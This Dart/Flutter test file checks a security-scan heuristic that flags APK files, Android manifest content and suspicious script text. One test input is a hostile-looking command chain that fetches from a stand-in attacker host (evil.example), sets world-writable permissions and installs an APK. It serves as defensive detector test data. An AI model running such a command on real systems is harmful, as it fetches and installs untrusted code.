import 'package:flutter_test/flutter_test.dart';
import 'package:nex_app/utils/security_scan_utils.dart';

void main() {
  group('security scan heuristics', () {
    test('flags APK-style artifacts as risky', () {
      final findings = detectSuspiciousSignals('malicious.apk', 4000, null);
      expect(findings, isNotEmpty);
      expect(findings.any((f) => f.reason == 'Binary package detected'), isTrue);
    });

    test('flags suspicious script text and payload keywords', () {
      final findings = detectSuspiciousSignals('payload.txt', 200, 'curl https://evil.example && chmod 777 /tmp/x && pm install /sdcard/app.apk');
      expect(findings.any((f) => f.severity == 'High'), isTrue);
      expect(findings.any((f) => f.reason == 'Exploit Pattern Matched'), isTrue);
    });

    test('detects Android manifest-like content and MIME-style package artifacts', () {
      final findings = detectSuspiciousSignals(
        'base.apk',
        128,
        '<manifest><application><uses-permission android:name="android.permission.camera"/></application></manifest>',
        [0x50, 0x4b, 0x03, 0x04],
      );
      expect(findings.any((f) => f.reason == 'Android Manifest Security Risk'), isTrue);
      expect(findings.any((f) => f.reason == 'Binary package detected'), isTrue);
    });
  });
}
